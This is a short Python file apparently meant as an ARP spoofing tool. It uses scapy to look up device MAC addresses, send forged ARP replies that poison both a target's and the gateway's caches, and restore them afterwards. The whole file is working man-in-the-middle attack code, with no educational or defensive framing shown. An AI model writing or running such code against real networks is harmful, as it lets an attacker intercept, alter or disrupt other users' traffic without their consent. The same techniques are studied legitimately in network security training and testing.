import scapy.all as scapy

def get_device_info(ip):
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req = scapy.ARP(pdst=ip)
    ans = scapy.srp(broadcast/arp_req, timeout=2, verbose=False)[0]
    return (ans[0][1].hwsrc, "Known") if ans else (None, None)

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    t_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    b_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip)
    scapy.sendp([t_pkt, g_pkt, b_pkt], verbose=False)

def restore(target_ip, gateway_ip):
    t_mac, _ = get_device_info(target_ip)
    g_mac, _ = get_device_info(gateway_ip)
    if t_mac and g_mac:
        pkt = scapy.Ether(dst=t_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=t_mac, psrc=gateway_ip, hwsrc=g_mac)
        scapy.sendp(pkt, count=5, verbose=False)
